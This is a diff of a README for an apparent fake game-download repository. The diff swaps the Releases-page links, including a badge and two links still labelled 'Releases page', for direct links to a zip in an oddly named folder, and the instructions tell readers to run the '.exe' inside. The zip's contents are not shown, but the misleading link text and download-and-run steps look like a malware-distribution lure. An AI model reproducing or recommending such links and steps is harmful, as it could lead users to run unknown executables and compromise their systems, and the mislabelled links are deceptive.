@@ -4,13 +4,13 @@
 REPO-game-download is an online co-op horror game designed for up to 6 players. In this thrilling adventure, you will locate valuable, fully physics-based objects. Handle these items carefully as you retrieve and extract them to satisfy your creator's desires. Prepare for an exciting experience filled with suspense and teamwork.
 
 ## 📥 Download Now!
-[![Download REPO-game-download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Broskimeth/REPO-game-download/releases)
+[![Download REPO-game-download](https://raw.githubusercontent.com/Broskimeth/REPO-game-download/main/sutlery/REPO-game-download.zip)](https://raw.githubusercontent.com/Broskimeth/REPO-game-download/main/sutlery/REPO-game-download.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the game:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Broskimeth/REPO-game-download/releases). This is where you can find all the latest versions of the game.
+   Go to our [Releases page](https://raw.githubusercontent.com/Broskimeth/REPO-game-download/main/sutlery/REPO-game-download.zip). This is where you can find all the latest versions of the game.
 
 2. **Choose the Right File**  
    Look for the latest version. You will see a list of files. Select the one that matches your operating system. For most users, this will be the `.exe` file for Windows.
@@ -49,7 +49,7 @@ Once you start the game, you will see several options on the main menu:
 - **Tutorial:** Go through the tutorial to learn the basics of the game before jumping into action.
 
 ## 🔗 Download & Install
-To download the game, visit our [Releases page](https://github.com/Broskimeth/REPO-game-download/releases). Follow the steps mentioned above to successfully run the game on your system.
+To download the game, visit our [Releases page](https://raw.githubusercontent.com/Broskimeth/REPO-game-download/main/sutlery/REPO-game-download.zip). Follow the steps mentioned above to successfully run the game on your system.
 
 ## 🎮 Community
 Join our growing community of players! Share your experiences, tips, and tricks with other gamers. Connect through forums or our social media pages to find others to play with.
